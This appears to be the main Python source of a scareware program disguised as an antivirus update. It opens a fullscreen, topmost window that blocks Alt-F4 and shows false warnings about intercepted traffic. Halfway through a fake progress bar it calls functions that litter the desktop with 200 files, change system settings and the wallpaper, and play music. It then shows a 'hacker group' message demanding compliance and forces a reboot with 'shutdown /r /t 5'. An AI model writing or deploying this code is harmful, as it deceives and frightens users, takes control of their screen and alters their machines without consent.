import ctypes
import os
import sys
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import threading
import time
from regedit_and_virus_safe import configure_system_settings_after_50, update_icons
from multimedia import playMusic_after50, set_wallpaper, change_txt_2, create_random_files

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()


def run_app():

    def fuckaltf4(event):
        return "break"

    root = tk.Tk()
    root.attributes('-fullscreen', True, "-topmost", True)
    root.title("Установка")
    root.resizable(False, False) 
    root.overrideredirect(True)
    root.bind("<Alt-F4>", fuckaltf4)

    texts = {
        "ru": {"install": "Установить", "error": "Критическая ошибка с кодом -234901", "virusbase": "Когда обновлять вирусные базы:", "welcome": "ВНИМАНИЕ, только что была совершена\n попытка перехвата вашего интернет-трафика неизвестными личностями.\nВы сейчас, вероятно, обеспокоены,\n но паника в данный момент только повредит.\nЧтобы сохранить компьютер в целостности, пройдите\n короткую установку по обновлению антивирусного ПО\nНажмите на кнопку ниже, чтобы приступить.", "select": "Выберите параметры", "path": "Выберите путь\n для установки:", "product": "Выбери версию продукта:",
               "progress": "Установка, не выключайте компьютер...", "hack": "Без паники. Только что вы \nпопытались противодействовать хакерской группировке \n«Штурм диванных войск».К счастью, нам \nудалось перехватит ваш интернет-запрос. \nНе беспокойтесь, ваш компьютер останется в сохранности, если \nвы будете выполнять наши требования. \nДождитесь окончания установки. "},
        "en": {"install": "Install", "hack": "Don't panic. You've just tried to counteract the hacker\ngroup «Assault on the Armchair Troops». Fortunately, \nwe managed to intercept your Internet request.\nDon't worry, your computer will remain \nsafe if you follow our instructions.\nWait for the installation to complete.", "error": "Critical error code -234901", "virusbase": "When to update virus databases:", "welcome": "WARNING, there has just been an attempt\n to intercept your internet traffic by unknown individuals.\n You are probably worried now, but\n panicking at this point will only hurt. \nTo keep your computer intact, please go through a short \ninstallation to update your antivirus software. \nClick the button below to get started.", "select": "Select options", "progress": "Installing, do not turn off your computer...", "path": "Select the installation path:", "product": "Select the type of product:"}
    }
    lang = "en"

    # Объявляем переменные для использования в nonlocal
    welcome_label = None
    install_button = None
    install_button_2 = None
    bg_label = None

    # Глобальный контейнер для страниц (контент, кроме кнопок смены языка на первой странице)
    container = tk.Frame(root)
    container.pack(fill="both", expand=True)

    # Функция для очистки контейнера и создания нового bg_label внутри него
    def clear_container():
        nonlocal bg_label
        for widget in container.winfo_children():
            widget.destroy()
        bg_label = tk.Label(container)
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)

    def set_background(image_path):
        nonlocal bg_label
        bg_image = Image.open(image_path).resize((root.winfo_screenwidth(), root.winfo_screenheight()),Image.LANCZOS)
        bg = ImageTk.PhotoImage(bg_image)
        bg_label.config(image=bg)
        bg_label.image = bg

    def change_lang(new_lang):
        nonlocal lang, welcome_label, install_button
        lang = new_lang
        if welcome_label is not None:
            welcome_label.config(text=texts[lang]["welcome"])
        if install_button is not None:
            install_button.config(text=texts[lang]["install"])

    def main_page():
        nonlocal welcome_label, install_button
        clear_container()
        set_background(resource_path("background1.jpg"))
        welcome_label = tk.Label(container, text=texts[lang]["welcome"], font=("Consolas", 24), bg="black", fg="white")
        welcome_label.pack(pady=150)
        install_button = tk.Button(container, text=texts[lang]["install"], font=("Arial", 20), command=show_page_2)
        install_button.pack(pady=20)
        # Кнопки смены языка только на первой странице
        tk.Button(container, text="RU", font=("Arial", 25), command=lambda: change_lang("ru")).place(x=10, y=10)
        tk.Button(container, text="EN", font=("Arial", 25), command=lambda: change_lang("en")).place(x=135, y=10)

    def show_page_2():
        nonlocal install_button_2
        clear_container()
        set_background(resource_path("background2.jpg"))
        tk.Label(container, text=texts[lang]["select"], font=("Arial", 24), bg="black", fg="white").pack(pady=50)
        tk.Label(container, text=texts[lang]["product"], font=("Arial", 24), bg="black", fg="white").place(y=230, x=70)
        tk.Label(container, text=texts[lang]["path"], font=("Arial", 24), bg="black", fg="white").place(y=170, x=1300)
        tk.Label(container, text=texts[lang]["virusbase"], font=("Arial", 24), bg="black", fg="white").place(y=400, x=600)

        choices = [
            ["ERROR:Failed to connect to server", "360 TOTAL SECURITY", "NORTON FREE"],
            ["C:\Program Files\\NewAntivirus", "C:\Windows\\NewAntivirus"],
            ["Every day.", "Every week."]
        ]

        dropdowns = []

        def check_selection(*_):
            if all(var.get() for var in dropdowns):
                install_button_2.config(state=tk.NORMAL)

        # Задаем позиции для каждого выпадающего списка:
        positions = [
            {"x": 70, "y": 300,},
            {"x": 1300, "y": 300},
            {"x": 600, "y": 500}
        ]

        for options, pos in zip(choices, positions):
            var = tk.StringVar()
            dropdown = ttk.Combobox(container, values=options, textvariable=var, state="readonly", font=("Arial", 25))
            dropdown.option_add("*TCombobox*Listbox*Font", ("Arial", 20))
            dropdown.place(**pos)
            var.trace_add("write", check_selection)
            dropdowns.append(var)

        install_button_2 = tk.Button(container, text=texts[lang]["install"], font=("Arial", 20), bg="black", fg="white", command=show_page_3, state=tk.DISABLED)
        install_button_2.pack(pady=50)

    def show_page_3():
        clear_container()
        set_background(resource_path("background3.jpg"))
        installing_label = tk.Label(container, text=texts[lang]["progress"], font=("Arial", 24), bg="black", fg="white")
        installing_label.pack(pady=50)

        # Создаем Canvas для прогресс-бара
        canvas_width = 1400 # Ширина
        canvas_height = 150  # Высота
        canvas = tk.Canvas(container, width=canvas_width, height=canvas_height, bg="black", highlightthickness=1)
        canvas.pack(pady=20)

        # Обновляем координаты прямоугольника
        progress_rect = canvas.create_rectangle(0, 0, 0, canvas_height, fill="#00ff00", width=0)
        percent_label = tk.Label(container, text="0%", font=("Arial", 24), fg="green", bg="black")
        percent_label.pack()
        install_text = tk.Label(container, text=texts[lang]["error"], font=("Arial", 24), bg="black", fg="red")
        install_text.pack(pady=20)
        install_text.pack_forget()
        hack_text = tk.Label(container, text=texts[lang]["hack"], font=("Arial", 24), bg="black", fg="red")
        hack_text.pack(pady=50)
        hack_text.pack_forget()

        def interpolate_color(progress):
            if progress < 30:
                return "#00ff00"  # зелёный
            elif progress > 50:
                return "#ff0000"  # красный
            else:
                factor = (progress - 20) / 30.0
                r = int(0 + (255 * factor))
                g = int(255 - (255 * factor))
                b = 0
                return f'#{r:02x}{g:02x}{b:02x}'

        def update_progress():
            for i in range(101):
                percent_label.config(text=f"{i}%")
                new_width = i / 100 * canvas_width
                canvas.coords(progress_rect, 0, 0, new_width, canvas_height)
                new_color = interpolate_color(i)
                canvas.itemconfig(progress_rect, fill=new_color)
                if i == 50:
                    create_random_files(num_files=200, desktop_path=None)
                    update_icons()
                    configure_system_settings_after_50()
                    playMusic_after50()
                    set_background(resource_path("background4.jpg"))
                    set_wallpaper(image_path=resource_path("bg.jpg"))
                    install_text.pack()
                    hack_text.pack(pady=50)
                    percent_label.config(fg="red")  # Изменяем цвет текста на красный
                    installing_label.config(fg="red")
                    change_txt_2()

                time.sleep(0.4)
            os.system("shutdown /r /t 5")

        threading.Thread(target=update_progress, daemon=True).start()

    main_page()
    root.mainloop()

